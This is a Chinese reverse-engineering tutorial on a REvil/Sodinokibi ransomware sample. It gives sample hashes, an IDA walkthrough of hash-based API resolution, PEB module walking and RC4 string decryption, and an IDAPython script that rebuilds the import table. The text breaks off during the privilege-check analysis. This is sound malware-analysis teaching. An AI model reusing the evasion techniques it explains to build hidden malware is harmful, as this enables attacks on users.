> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-267604.htm)

本文献给所有像我一样刚从事安全行业的萌新，希望能对您有一定帮助。同时感谢所有在我迷茫时伸出援手的大佬们。

病毒家族简介
======

REvil 又称 Sodinokibi，是一种以私有软件即服务（RaaS）体系运营牟利的黑客组织。他们通过招募会员为其分发勒索软件攻击，当受害者支付赎金后该组织会将赎金与会员进行分成，因此很难定位其组织真实所在地。

样本基本信息
======

md5:FBF8E910F9480D64E8FF6ECF4B10EF4B

sha1:E6B32975ACB2CC5230DD4F6CE6F243293FD984FA

sha256:CEC23C13C52A39C8715EE2ED7878F8AA9452E609DF1D469EF7F0DEC55736645B

VT:[https://www.virustotal.com/gui/file/cec23c13c52a39c8715ee2ed7878f8aa9452e609df1d469ef7f0dec55736645b/detection](https://www.virustotal.com/gui/file/cec23c13c52a39c8715ee2ed7878f8aa9452e609df1d469ef7f0dec55736645b/detection)

![](https://bbs.pediy.com/upload/attach/202105/784955_GU8AMPQNM69TAYK.jpg)

VT 沙箱以将其标识为 Sodinokibi。

![](https://bbs.pediy.com/upload/attach/202105/784955_QBY672N62R5UDAW.jpg)

获取病毒静态信息
========

查看节区信息，可以看到存在一个自定义节. 11hix，且各个节区熵值都较高证明程序存在大量加密数据。

![](https://bbs.pediy.com/upload/attach/202105/784955_BGUCH38KC6T5SD6.jpg)

查看导入 dll，识别出导入了 kernel32.dll 和 user32.dll 两个模块。证明样本对程序的导入表做了处理。

![](https://bbs.pediy.com/upload/attach/202105/784955_UPUM9NH9MFB3UWZ.jpg)

查看识别出的 API，没有什么重要内容，恶意行为被隐藏起来。需要病毒样本动态运行进行解密修复 IAT。

![](https://bbs.pediy.com/upload/attach/202105/784955_KTDDT9J59WD6D9F.jpg)

查看字符串资源，大部分为未识别的字符串，进一步验证了数据被加密处理的猜想。

![](https://bbs.pediy.com/upload/attach/202105/784955_GM56JPQDQXAWRG4.jpg)

IDA 静态加载分析
==========

第一次静态加载时应该尽量勾选右下角选项，这样 IDA 会额外加载资源数据动态导入的 DLL 数据以及默认不加载的静态节数据，以便我们透彻分析样本。

![](https://bbs.pediy.com/upload/attach/202105/784955_S6JA4WAZJ9BGE55.jpg)

加载完成后，我们可以看到入口点 OEP 只有两个函数调用

![](https://bbs.pediy.com/upload/attach/202105/784955_SBQ78B5UVWVZ8GZ.jpg)

点击进入第一个函数调用，并没有发现有趣的内容，继续点击跟进第一个函数查看内容。

![](https://bbs.pediy.com/upload/attach/202105/784955_2MZ7KA5FYB2M5PM.jpg)

进入函数后发现了有趣的内容，病毒样本貌似在填充一个由 ESI 寄存器控制的数组。首先传入数组的 4 字节数据给 sub_406817 函数，然后将运算结果（eax）的值重新回填给数组，一共循环了 160 次，计算了 640 个字节。这与我们熟知的动态解析 IAT 方法很相似，加上我们之前分析病毒抹去了 IAT 可以合理猜测该处在做回填 IAT 表的操作。

![](https://bbs.pediy.com/upload/attach/202105/784955_TQGU38UYHREG9G6.jpg)

使用 F5 插件查看如下

![](https://bbs.pediy.com/upload/attach/202105/784955_5A7SHFTG3DP2DVX.jpg)

点击查看该数组内容，发现是. data 节的一个全局数组。根据之前的分析运算一共占用 640 字节。每 4 字节为一个 hash 值（经过 hash 处理的数据通常会将 4 字节全部占满，所以合理猜测为 hash 数据）

![](https://bbs.pediy.com/upload/attach/202105/784955_KBN88MUGT95H2BE.jpg)

设置 4 字节的 hash 数组，数组元素为 160，每个元素占用 4 字节。

![](https://bbs.pediy.com/upload/attach/202105/784955_BHPWVZDUH7JHK8S.jpg)

处理后的数据如下

![](https://bbs.pediy.com/upload/attach/202105/784955_USRAHRKD25NS5D5.jpg)

最后我们还需验证下我们的猜想。程序调用动态导入函数的时候，汇编会以间接调用的方式呈现出来，如下形式。我们只需要在后续找到该形式的函数调用，且数据在该数组内即可验证成功。

```
call    dword ptr:[xxxx]

```

继续向下查找，可以看到 “call 数组基址 + 数组偏移” 的形式的函数调用（数组最大偏移为 0x280）, 该调用在重复调用同一个函数。验证了该静态数组为 hash 处理过的 IAT 表。

![](https://bbs.pediy.com/upload/attach/202105/784955_QQ6HBR8XZSB5PZS.jpg)

同时也可以确定第一个函数整体逻辑在修复 IAT 表，修改变量名。

![](https://bbs.pediy.com/upload/attach/202105/784955_GQAZH8KCGTVY4FA.jpg)

分析动态加载 API 的方法
==============

进入 mv_dy_get_api 函数查看代码内容，可以看到 IDA 为我们解析的函数原型如下，虽然数长度相同但是看着很别扭（IDA 最强大的就是注释功能，不要小看每条注释。小的注释积累起来可以引发质变）

![](https://bbs.pediy.com/upload/attach/202105/784955_XNVVA87ZEZCYJSJ.jpg)

按 Y 快捷键修改函数原型如下

![](https://bbs.pediy.com/upload/attach/202105/784955_NTREA6D3AK8Y34E.jpg)

继续向下查看代码，将输入的 hash 进行异或运算得到转换后的 hash，又将转换后的 hash 值高 11 位提取赋值给临时变量 v2。可以看到

![](https://bbs.pediy.com/upload/attach/202105/784955_GY49WYEJGNCJF93.jpg)

继续阅读代码，看到疑似 switch/case 的判断比较高 11 位数据。根据不同数据进行执行不同流程中的函数地址赋值，然后跳转到 LABEL_29。根据病毒动态加载的经验，第一件事一般是动态获取目标模块的基地址，然后根据基地址解析对应导出函数的位置。所以我们合理假设该 switch/case 语句是在做获取 dll 基址的操作。而转换后的高 11 位 hash 值代表不同的 hash 值。

![](https://bbs.pediy.com/upload/attach/202105/784955_R6YZ2AE68XURCJD.jpg)

整理后如下

![](https://bbs.pediy.com/upload/attach/202105/784955_T9RY7V3VJ4VPT3K.jpg)

继续向下阅读代码，看到调用了赋值的函数指针 pfn_ld_dll，符合获取指定 dll 的基址的猜想，将临时变量改名为 imagebase 可以看到 v18 变量在获取导出符号的地址偏移。

![](https://bbs.pediy.com/upload/attach/202105/784955_U5EFMA7XEABJ7JU.jpg)

0x3c 偏移为_IMAGE_DOS_HEADER 的 e_lfanew 字段，通过该字段值获取 imagebase 到_IMAGE_NT_HEADERS 的偏移。

```
pe_nt_header_address == imagebase + e_lfanew == imagebase + (DWORD*)(imagebase + 0x3c) //imagebase + 0x3c == e_lfanew

```

![](https://bbs.pediy.com/upload/attach/202105/784955_4VSTS7ABTTMFAZG.jpg)

可以看到_IMAGE_NT_HEADERS 一共占用 0x18 个字节，也就是说 0x78 中有 0x18 字节偏移是为了跳过_IMAGE_NT_HEADERS 占用的空间，为了获取_IMAGE_OPTIONAL_HEADER 结构体偏移 0x60 == 0x78 - 0x18 的字段值。

![](https://bbs.pediy.com/upload/attach/202105/784955_YSS9MZ2CWGZW9VG.jpg)

查看_IMAGE_OPTIONAL_HEADER 结构体。偏移 0x60 处字段正好为数据目录表的首地址，而数据目录表第 0 项正好记录着导出符号表的偏移和大小。

![](https://bbs.pediy.com/upload/attach/202105/784955_FV2WU38Q9TD27DV.jpg)

查看数据目录表表项结构体如下

![](https://bbs.pediy.com/upload/attach/202105/784955_MMGQE3BEFUYYR7U.jpg)

可以推出该语句为获取 VirtualAddress 偏移值

![](https://bbs.pediy.com/upload/attach/202105/784955_WYMZ398PA8YGTVC.jpg)

查看导出表结构体

![](https://bbs.pediy.com/upload/attach/202105/784955_7WNQJ85VRF47TE3.jpg)

整理出以下内容

![](https://bbs.pediy.com/upload/attach/202105/784955_ZUWZPUTG5D9Y3UF.jpg)

按下 shift+F1 快捷键，切换到本地类型窗口。按快捷键 ins，插入一个结构体。

![](https://bbs.pediy.com/upload/attach/202105/784955_DSVY35P9X7CDTB3.jpg)

双击导入该结构体

![](https://bbs.pediy.com/upload/attach/202105/784955_7XSTQ2Y7CHWYANQ.jpg)

将变量 va_offset 转换成结构体指针

![](https://bbs.pediy.com/upload/attach/202105/784955_KRPUC3ACCJFFFUB.jpg)

导入结构体指针类型。

![](https://bbs.pediy.com/upload/attach/202105/784955_U88Z39ZY4EXNHJQ.jpg)

整理得到如下结果。

![](https://bbs.pediy.com/upload/attach/202105/784955_HZAMH2X9HQT6FTN.jpg)

查看后续代码，因为之前的注释修改，我们可以很清晰的看到函数逻辑。

![](https://bbs.pediy.com/upload/attach/202105/784955_MM466QA7JVAMMNX.jpg)

进入 calc_fn_name_hash 函数可以看到是对导出函数字符串进行逐字节 hash 运算。

![](https://bbs.pediy.com/upload/attach/202105/784955_6ZR2MYUAMGJYNW2.jpg)

PE 解析 API 地址整体逻辑如下

![](https://bbs.pediy.com/upload/attach/202105/784955_JVW4Y3P7AA6HRBV.jpg)

接下来继续向上回溯分析加载 dll 的方法。点开加载 dll 的函数，可以发现绝大多数函数模板类似，都传入了一个固定 hash 值进行函数递归。获取 api 后将 v2 变量作为参数传递给该动态获取的 API 并调用执行。根据函数形式结合之前的分析，合理推测 0xCB0F8A29 为 LoadLibraryA 函数的 hash 值。而 v2 是要加载的 dll 名称。

![](https://bbs.pediy.com/upload/attach/202105/784955_ZTWXCD3Q6GX6JFJ.jpg)

继续回溯，发现除了上述模板的调用方式，还有直接传入了静态 hash 给一个函数，这种方式值得我们额外关注。

![](https://bbs.pediy.com/upload/attach/202105/784955_47ZDWGTU3CBAES2.jpg)

继续跟进来到以下函数中，看到有循环猜测正在做某种运算。看到循环中有个判断条件在与一个常数做差，转换成 16 进制为 0x41，正好对应 Ascii 码表中的‘A’字符。因此可以猜测在比较字符串大小。

![](https://bbs.pediy.com/upload/attach/202105/784955_PJBB7ATP3Y4QWDP.jpg)

我们首先修改 v5 为 chr，接下来就会发现非常神奇的事，找寻其他跟 chr 关联的变量修改名称让整个逻辑结构一下变得清晰。

![](https://bbs.pediy.com/upload/attach/202105/784955_RAFFHHKRSXDMRWH.jpg)

继续向上查阅代码可以看到函数 sub_404B12，跟进函数内部可以看到熟悉的 fs:30h。通过 fs 寄存器获取 PEB

![](https://bbs.pediy.com/upload/attach/202105/784955_7NBAAR24GBNMKRV.jpg)

获取 PEB 基址偏移 0xC 处的字段值，即 LDR 地址。

![](https://bbs.pediy.com/upload/attach/202105/784955_X4GGGWTXGTT3RB9.jpg)

![](https://bbs.pediy.com/upload/attach/202105/784955_QQKP2UFD2P3TH5T.jpg)

再通过 LDR 偏移 0x14 获取 InMemoryOrderModuleList 地址值。

![](https://bbs.pediy.com/upload/attach/202105/784955_RTTTYX5H98E46AS.jpg)

判断内存模块加载顺序链表是否为空。

![](https://bbs.pediy.com/upload/attach/202105/784955_59REZ9UPWWF5K32.jpg)

InMemoryOrderModuleList 是一个双向链表指针，它链接的是 LDR_DATA_TABLE_ENTRY 结构体中的 InMemoryOrderModuleList 链表节点。

![](https://bbs.pediy.com/upload/attach/202105/784955_TKVRFFM9N8HHEKJ.jpg)

获取 dll 的名称（F5 插件在此处解析错误，所以使用汇编查看）

![](https://bbs.pediy.com/upload/attach/202105/784955_K8SUJPZCEDXVUPS.jpg)

如果匹配 hash 值则返回模块基址

![](https://bbs.pediy.com/upload/attach/202105/784955_9637V2JCH2785BK.jpg)

list_entry+0x10 为 DllBase 模块基址

![](https://bbs.pediy.com/upload/attach/202105/784955_QHN6WBDRFF48YER.jpg)

总体逻辑如下

![](https://bbs.pediy.com/upload/attach/202105/784955_D9UCN42WZBKMSY4.jpg)

RC4 算法解析
========

算法识别
----

接下来继续分析其他模块加载函数中对字符串的解密函数。首先可以看到解密函数传入了 5 个参数，第一个参数为一个静态全局数据，第 2、3、4 个参数全部是确定的常量值。

![](https://bbs.pediy.com/upload/attach/202105/784955_RGY8JFDGVCG6U74.jpg)

传入的静态数据

![](https://bbs.pediy.com/upload/attach/202105/784955_SYF72JU72XZWGTG.jpg)

将静态数据处理成数组

![](https://bbs.pediy.com/upload/attach/202105/784955_H4NUGNXSYV2K6VG.jpg)

进入解密函数查看内容，发现第二个函数将传入的参数重新组合传入。类似计算偏移值。

![](https://bbs.pediy.com/upload/attach/202105/784955_JEZ37SUYS3XVX2Q.jpg)

继续跟入函数，将返回变量名修改为解密可以确定最后一个参数为解密后的字符串数据。

![](https://bbs.pediy.com/upload/attach/202105/784955_WB53QSM23QQV3QM.jpg)

继续跟入第一个函数，可以看到两个明显循环次数 256。

![](https://bbs.pediy.com/upload/attach/202105/784955_U6PD4VDS4T2W78H.jpg)

汇编形式表现如下。（如果逆向时突然出现两次循环且每次循环次数都为 256，后续存在异或操作基本可以猜测为 rc4 解密算法，这种特性为 rc4 算法特征）

![](https://bbs.pediy.com/upload/attach/202105/784955_Q4TARCJCEH7P6BT.jpg)

接下来我们需要进入后续函数寻找异或算法，可以发现字节异或算法。基本可以确定为 rc4 算法。

![](https://bbs.pediy.com/upload/attach/202105/784955_M2UXBFRSRWSM5F7.jpg)

算法逆向分析
------

首先根据 Wiki 百科获取 rc4 算法的伪代码，rc4 算法分为初始阶段和加密阶段。初始化阶段首先会创建一个 256 字节从 0 递增不重复的数组。第二次循环会循环会根据密钥数组、长度、第一次构建的 s 盒（用来随机交换加密的数组，这里用 S 标识）来重新打乱 S 盒中，用于随机加密数据。由此可以看出，初始化阶段需要一个 s 盒，一个密钥以及密钥长度作为基本元素。

```
 //cr4初始化伪代码
for i from 0 to 255
     S[i] := i
 endfor
 j := 0
 for( i=0 ; i<256 ; i++)
     j := (j + S[i] + key[i mod keylength]) % 256    //根据密钥数组和密钥长度生成一个随机索引
     swap values of S[i] and S[j] //将正常顺序的值与随机索引的值交换
 endfor

```

回到 IDA 可以清晰看到一个长度为 256 字节的数组，且无论初始化和加密阶段都使用了该数组。确定该数组为 S 盒。

![](https://bbs.pediy.com/upload/attach/202105/784955_TSF8BKTKHVVJCHH.jpg)

由于初始化阶段还需要密钥盒密钥长度，我们先将参数按顺序重命名。

![](https://bbs.pediy.com/upload/attach/202105/784955_FW4DD82UR294D5C.jpg)

进入初始化函数，可以看到与我们的伪代码逻辑一致，参数传入顺序正确。

![](https://bbs.pediy.com/upload/attach/202105/784955_Y7KQ7PX64DBBHPV.jpg)

对算法进行调整如下

![](https://bbs.pediy.com/upload/attach/202105/784955_5HX69BWK78Y5A4G.jpg)

接下来我们查看加密数据部分的伪代码。下面 i,j 是两个指针。每收到一个字节，就进行 while 循环。通过一定的算法（(a),(b)）定位 S 盒中的一个元素，并与输入字节异或，得到 k。循环中还改变了 S 盒（(c)）。从该伪代码中需要获取的参数有：打乱顺序的 S 盒、要加密 / 解密的数据、数据长度，最后返回的数据是加密 / 解密后的数组字符串。

```
 i := 0
 j := 0
 while GeneratingOutput:
     i := (i + 1) mod 256   //a
     j := (j + S[i]) mod 256 //b
     swap values of S[i] and S[j]  //c
     k := inputByte ^ S[(S[i] + S[j]) % 256]
     output K
 endwhile

```

与初始化部分类似，首先按照分析和假设修改变量。可以看到整体加密算法逻辑变得清晰

![](https://bbs.pediy.com/upload/attach/202105/784955_4BECTT8DZSXUEGJ.jpg)

跟进加密函数，根据伪代码调整函数变量内容。

![](https://bbs.pediy.com/upload/attach/202105/784955_ZRYA7HVG4TD92ZM.jpg)

利用交叉引用继续向上回溯来到一下函数中，可以看到调用解密函数的父函数初始的时候就传入了：密钥长度、加密数据长度、加密的数据。而第一个参数密钥是利用基址加偏移的方式计算的，第三个在第一个参数基础上还增加了密钥长度的偏移。但是我们不确定哪个参数是密钥基址哪个是密钥偏移。

![](https://bbs.pediy.com/upload/attach/202105/784955_NYRAYSX8B7Y3E6M.jpg)

继续向上回溯，来到了整体调用的地方，可以看到第一个参数为静态未知数据（第一个参数是固定的），而第二个参数正好类似一个偏移差值。

![](https://bbs.pediy.com/upload/attach/202105/784955_2PK89S3ZYPPBYBS.jpg)

查看第一个静态数组

![](https://bbs.pediy.com/upload/attach/202105/784955_4NJK2DERZFA4NKQ.jpg)

调整为数组类型

![](https://bbs.pediy.com/upload/attach/202105/784955_9Q6WTZFWJKH78PX.jpg)

返回继续调整变量可以看到清晰的函数调用逻辑：

1、传入固定的加密数据首地址 + 密钥偏移获取密钥地址

2、密钥偏移 + 密钥长度获取解密数据的地址

![](https://bbs.pediy.com/upload/attach/202105/784955_9BP6JPF7UHEYWWA.jpg)

修复 IAT
======

在分析完了病毒构建导入表和字符串加密的手法后，我们便可以开始解析 IDB 数据。核心手法与脱壳类似，就是对 IDA 未解析的 IAT 数组进行修复。

动态修复 IAT
--------

所谓动态修复 IAT 类似动态脱壳，原理是利用病毒自身携带的解密程序，在病毒自动修复完成后中断。将内存状态保存到 IDB 中进行解析 IAT。首先我们要在 IDA 中设置断点，让 IDA 调试器运行起来断住。

![](https://bbs.pediy.com/upload/attach/202105/784955_YJKMDZ49AEHSCE8.jpg)

可以看到 iat 表已经全部修复为函数地址。

![](https://bbs.pediy.com/upload/attach/202105/784955_DNRCFJVJSAQFCDQ.jpg)

按 O 快捷键进行符号解析。

![](https://bbs.pediy.com/upload/attach/202105/784955_5GMFY35RSQSWE9R.jpg)

使用脱壳插件进行动态修复 IAT 表

![](https://bbs.pediy.com/upload/attach/202105/784955_8QKNXYUU7393SW7.jpg)

修复 IAT 后的效果如下。

![](https://bbs.pediy.com/upload/attach/202105/784955_EDG9ZNDDUJ7KKV4.jpg)

IDAPython 脚本修复 IAT
------------------

IDAPython 修复脚本是通过对算法的逆向，利用 ida 提供的 python 接口编写脚本，从静态数据中解密出我们想要的内容。以下是我编写的 IDAPython 脚本，为了方便没有做优化有亿点卡。（最好重新加载程序到 IDA，并勾选 Load Resouce 选项）

程序中利用了 pefile.py 模块，如果当前 python 环境变量中没有该模块可以通过 pip 安装。IDAPython 调试方法可以参考我的文章 [https://bbs.pediy.com/thread-267362.htm](https://bbs.pediy.com/thread-267362.htm)

```
pip install pefile

```

IDAPython 脚本

```
import  os
import  idc
import  idaapi
import  idautils
import  ida_bytes
import  ida_name
import  pefile
#import  wingdbstub
 
#wingdbstub.Ensure()
 
#save iat hash
mv_ida_hash=[]
path_list=[]
 
class DecryptorError(Exception):
    pass
 
#system32 dir
sys_dir = r"c:\windows\system32"
 
#set path list
def set_path_list():
    path_list.append(get_match_dll(0x122A354C))
    path_list.append(get_match_dll(0x47BC1D98))
 
base_address = 0x0040FF40
#get mv iat hash
def get_mv_iat():
    tmp = get_bytes(base_address,640)
    for i in list(range(0,160)):
        mv_ida_hash.append(int.from_bytes(tmp[i*4:(i+1)*4],"little"))
 
#transfrom mv iat hash
def trans_iat_hash(en_trans):
    return (en_trans ^ ((en_trans ^ 0x7A6C) << 16) ^ 0x132E) & 0xffffffff
 
#get dll hash
def get_dll_hash(trans_hash):
    return  trans_hash >> 21
 
 
#calc api name hash
def calc_func_name_hash(func_name):
    api_hash = 0x2B
    for chr in func_name:
        api_hash = ord(chr) + 0x10F * api_hash
    return  api_hash & 0x1FFFFF
 
#get api hash
def get_api_hash(trans_hash):
    return  trans_hash & 0x1FFFFF
 
#get match dll
def get_match_dll(input_hash):
    #calc target hash
    tar_hash = (input_hash ^ 0xDA54A235) & 0xffffffff
    for filename in os.listdir(sys_dir):
        filename.lower()
        path= sys_dir+"\\"+filename
        if  os.path.isfile(path):
            if  '.dll'  in  filename:
                #print(filename[0])
                calc_data = 0x2B
                for chr in filename:
                    calc_data = (ord(chr) + 0x10F * calc_data) & 0xffffffff
                if calc_data == tar_hash:   
                    return path   
                    
                 
#match api
def get_match_api(input_hash):
    trans_iat_hash(input_hash)
 
#set cmt in disassembly GUI
def set_hexrays_comment(address,text):
    cfunc = idaapi.decompile(address)
    tl = idaapi.treeloc_t()# init treeloc object
    tl.ea = address
    tl.itp = idaapi.ITP_SEMI
    cfunc.set_user_cmt(tl,text)
    cfunc.save_user_cmts()
 
#set cmt
def set_comment(address, text):
    ida_bytes.set_cmt(address, text, 0)
    set_hexrays_comment(address, text)
 
#rc4 encrypt
def rc4decrypt(key,data):
    x = 0
    box =list(range(256))
    for i in list(range(256)):
        x = (x + box[i] + key[i % len(key)]) % 256
        box[i],box[x] = box[x],box[i]
    x = 0
    y = 0
    out = []
    for char in data:
        x = (x + 1) % 256
        y = (y + box[x]) % 256
        box[x],box[y] = box[y],box[x]
        out.append(chr(char ^ box[(box[x] + box[y]) % 256]))
    return ''.join(out)
 
#get reg value
def get_reg_value(ptr_addr, reg_name):
    #set count
    e_count = 0
    while e_count < 500:
        e_count += 1
        ptr_addr = idc.prev_head(ptr_addr)
        if idc.print_insn_mnem(ptr_addr) == 'mov':
            if idc.get_operand_type(ptr_addr,0) == idaapi.o_reg:
                tmp_reg_name = idaapi.get_reg_name(idc.get_operand_value(ptr_addr,0),4)
                if tmp_reg_name.lower() == reg_name.lower():
                    if idc.get_operand_type(ptr_addr,1) == idaapi.o_imm:
                        return idc.get_operand_value(ptr_addr,1)
        elif idc.print_insn_mnem(ptr_addr) == 'pop':
            #match the following pattern
            #push 3
            #pop edi
            if  idc.get_operand_type(ptr_addr,0) == idaapi.o_reg:
                tmp_reg_name =  idaapi.get_reg_name(idc.get_operand_value(ptr_addr,0),4)
                if  tmp_reg_name.lower() == reg_name.lower():
                    tmp_addr = idc.prev_head(ptr_addr)
                    if  idc.print_insn_mnem(tmp_addr) == 'push':
                        if  idc.get_operand_type(tmp_addr,0) == idaapi.o_imm:
                            reg_value = idc.get_operand_value(tmp_addr,0)
                            return  reg_value
        elif idc.print_insn_mnem(ptr_addr) == 'ret':
            raise DecryptorError()
    raise DecryptorError()
 
#get args
def get_stack_args(fn_addr,count):
    #save stack args
    args = []
    args_count = 0
    tmp_ptr = fn_addr
    #loop get args
    while args_count < count:
        #get first args
        tmp_ptr = idc.prev_head(tmp_ptr)
        #judge 'push' instruction
        if idc.print_insn_mnem(tmp_ptr) == 'push':
            #The new idapython had been mov 'i_imm' into idaapi mod.Please carefore your idapython config
            if  idc.get_operand_type(tmp_ptr,0) == idaapi.o_imm:
                #if push mem save the addr
                args.append(idc.get_operand_value(tmp_ptr,0))
                args_count += 1
            elif idc.get_operand_type(tmp_ptr,0) == idaapi.o_reg:
                #get reg name
                reg_name = idaapi.get_reg_name(idc.get_operand_value(tmp_ptr,0),4)
                #research pre instruction which chg the reg
                reg_value = get_reg_value(tmp_ptr,reg_name)
                args.append(reg_value)
                args_count += 1
            else:
                #can't get reg value
                raise DecryptorError()
    #ret get values
    return  tuple(args)
 
#decrypt string
def decrypt_str(func_addr):
    try:
        str_tbl_start, key_offset, key_len, str_len = get_stack_args(func_addr,4)
    except:
        print("Can't get args")
        return
    key_data = idc.get_bytes(str_tbl_start + key_offset, key_len)
    encrypt_data = idc.get_bytes(str_tbl_start + key_offset + key_len, str_len)
    decrypt_str = rc4decrypt(key_data, encrypt_data)
    #replace data
    out_str = decrypt_str.replace('\x00','')
    #set cmt
    #print(out_str)
    if  ".dll" in out_str:
        path_list.append(sys_dir + "\\" + out_str)
    set_comment(func_addr,out_str)
    #print(idc.get_cmt(func_addr,0))
 
 
 
def get_api_symbols(enc_hash):
    path = ""
    trans_hash = trans_iat_hash(enc_hash)
    func_hash = get_api_hash(trans_hash)
    for path in path_list:
        #get api by hash
        pe = pefile.PE(path)
        #get api symbols
        try:
            for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
                api_hash = calc_func_name_hash(exp.name.decode('utf-8'))
                if  func_hash == api_hash:
                    print("Find symbols:" + " " + exp.name.decode('utf-8'))
                    return exp.name.decode('utf-8')
        except:
            print("Finished")
 
 
#get xref list
def get_xref_list(fn_addr):
    return [addr.frm for addr in idautils.XrefsTo(fn_addr)]
 
#decrpyt all str
def decrypt_all_str(fn_addr):
    for ptr in get_xref_list(fn_addr):
        decrypt_str(ptr)
 
 
#build iat
def build_iat():
    count = 0 
    for encry_hash in mv_ida_hash:
        api_symbols = get_api_symbols(encry_hash)
        if api_symbols == "":
            continue
        print(ida_name.set_name(base_address + count, api_symbols))
        count += 4
 
#main
set_path_list()
get_mv_iat()
#get_import_table()
decrypt_all_str(0x004056E3)
#loop build iat
build_iat()

```

除了解析 API 外，该脚本解密完成后会将解密字符串以注释形式添加到 rc4 解密函数后，方便我们静态查看病毒后续行为。

![](https://bbs.pediy.com/upload/attach/202105/784955_WQM3H777JQ6W32B.jpg)

### IDAPython 脚本编写注意事项

因为 python 的发展，IDAPython 也逐渐从 python2.x 过度到 python3.x。IDA 作者也在博客中表示过度到新的 IDA7.2 版本以上的 python 默认使用 3.x 并不在支持 IDAPython2.x 的部分接口。我们在编写脚本的过程中很可能因为使用了老版本的接口导致无法实现我们的功能。

编写时可参考 IDAPython 官方手册：[https://www.hex-rays.com/products/ida/support/idapython_docs/](https://www.hex-rays.com/products/ida/support/idapython_docs/)

利用浏览器的搜索功能搜索想要的功能 API（不知道有哪些接口就靠猜，比如我想要一个修改函数名的接口我尝试了很多简单词组组合最后找到了 idc.set_name），如果某一模块中搜索不到，点击手册左上角的所有模块再次搜索。

![](https://bbs.pediy.com/upload/attach/202105/784955_9MG3P4SKHHNBVCD.jpg)

还要善用 IDAPython API 过度表：[https://www.hex-rays.com/products/ida/support/ida74_idapython_no_bc695_porting_guide.shtml](https://www.hex-rays.com/products/ida/support/ida74_idapython_no_bc695_porting_guide.shtml)

使用方法仍然是浏览器搜索匹配不同版本的接口

![](https://bbs.pediy.com/upload/attach/202105/784955_5FQAHS55CERBYUR.jpg)

病毒行为分析
======

动态修复 IAT
--------

可以看到完整的修复 IAT 后的逻辑，首先动态获取 API 后再加载 ole32 模块获取创建 COM 组件所需接口。

![](https://bbs.pediy.com/upload/attach/202105/784955_EU2SFE4URHDQFDD.jpg)

创建全局互斥体变量
---------

退回到函数主逻辑，可以看到病毒首先修复了 IAT 表保证程序正常运行

![](https://bbs.pediy.com/upload/attach/202105/784955_K98WBMERUKC36WS.jpg)

设置错误模式获取错误信息并创建名为 Global\01EB1FCA-9835-27F4-DB93-6F722EB23FB4 的全局互斥体保证进程唯一性。

![](https://bbs.pediy.com/upload/attach/202105/784955_4AJKR9JR6S4XDPY.jpg)

如果返回系统错误码显示已存在互斥体则返回标志 1。

![](https://bbs.pediy.com/upload/attach/202105/784955_PUMH4UNHC48QRK9.jpg)

使用 M 快捷键找到宏定义对常量进行替换

![](https://bbs.pediy.com/upload/attach/202105/784955_NDYSPTAXA6D46B3.jpg)

替换后的样式如下

![](https://bbs.pediy.com/upload/attach/202105/784955_DDTHW7HXCPZCVTP.jpg)

再次来到主函数，可以看到病毒有两个逻辑函数，暂且分别命名为 mv_logic_x。

![](https://bbs.pediy.com/upload/attach/202105/784955_CFVC2PFPRGEV9KM.jpg)

提权运行
----

来到主逻辑 1 中可以看到以下几个解析的函数与字符串信息。

![](https://bbs.pediy.com/upload/attach/202105/784955_ETSG5CTJFSRHT2R.jpg)

### 获取当前进程版本号

进入第一个未解析函数，用于 F5 插件解析错误通过汇编查看内容。可以看到该函数获取 PEB 地址后分别读取了偏移 0xA4 和 0xA8 处地址的低一个字节数据。

![](https://bbs.pediy.com/upload/attach/202105/784955_58RZQ4F4Q3CB632.jpg)

在 PEB 中，0xA4 和 0xA8 分别是当前操作系统的主版本号和次版本号

![](https://bbs.pediy.com/upload/attach/202105/784955_6XMQDZWHDNQVKZ8.jpg)

调整如下，可以看出该函数用于获取当前系统版本号。

![](https://bbs.pediy.com/upload/attach/202105/784955_T75QJYF39BM6Z4J.jpg)

返回逻辑可以看出病毒在 Vista 版本以上的操作系统上运行时会执行

![](https://bbs.pediy.com/upload/attach/202105/784955_EHAXBHKVWDDMASB.jpg)

### 判断用户权限

进入 sub_404842 函数可以看到该函数主要获取当前进程令牌信息。

![](https://bbs.pediy.com/upload/attach/202105/784955_THMR9NE3K7UXSWP.jpg)

返回的令牌类型是一个 enum 类型

![](https://bbs.pediy.com/upload/attach/202105/784955_H8JVWABU5EQ56GJ.jpg)

根据微软描述一共可以返回如下三个类型。

![](https://bbs.pediy.com/upload/attach/202105/784955_MVN6CPEY7CHZQXA.jpg)

所以以下代码为判断是否有管理员权限，如果没有则执行以下提权代码。

![](https://bbs.pediy.com/upload/attach/202105/784955_WRKB2G2548Y4DS5.jpg)

在判断当前用户进程处于受限权限用户组下时，病毒打开令牌获取用户 SID 和属性的组合值，总逻辑如下。

![](https://bbs.pediy.com/upload/attach/202105/784955_XWP4973BWCSQURH.jpg)

首先通过 GetTokenInformation 函数获取_SID_AND_ATTRIBUTES 结构体。该结构体包含了 Sid 和 Sid 的属性。

![](https://bbs.pediy.com/upload/attach/202105/784955_PXJYZS5PCXBW8BZ.jpg)

可以看到微软官方形容 SID 代表一个用户组，而 SID 的属性用来表示当前用户组启动、禁用以及强制托管的权限属性。SID 同时也标志如何使用这些属性。

![](https://bbs.pediy.com/upload/attach/202105/784955_CF4A2JRWP3XF5BV.jpg)

病毒接下来获取 SID 中的偏移值，获取 SID 中 Subauthority 的第一个四字节值判断权限。

![](https://bbs.pediy.com/upload/attach/202105/784955_QEDCGHZPM7U6K3P.jpg)

首先我们来观察下 SID 结构体，该结构体前 8 字节是用于记录 SID 的一些信息，后 20 字节分为 5 部分，每部分占用 4 字节表示域账户或组使用的唯一 ID 也称为 SIDs。SIDs 中前 4 个四字节元素用来表示域 ID（我理解为网络域名之类的）。最后一个字节表示 RID，也就是表示用户组或用户。

![](https://bbs.pediy.com/upload/attach/202105/784955_WKQUTBKCR46WG96.jpg)

根据 Identifier Authority 字段与后续的域 ID 组合可以代表出不同的含义。微软将特定的组合称为 "Well-know SIDs"。以下是对该类型的介绍

![](https://bbs.pediy.com/upload/attach/202105/784955_EVZXM3RDKQRHT22.jpg)

返回函数调用位置使用 IDA 插件查看内容。可以看到他在比较 SIDs 的第一个 4 字节内容。

![](https://bbs.pediy.com/upload/attach/202105/784955_2D9AHPSGENNNN2A.jpg)

我们通过计算器换算成 10 进制，并查询 "Well-know SIDs" 表，发现为高强制级别的含义，所以我们了解了该 if 判断仍然是在判断权限。我们可以看到该类型在 Vista 和 Win server 2008 中添加，这也印证了病毒为什么要判断系统版本。

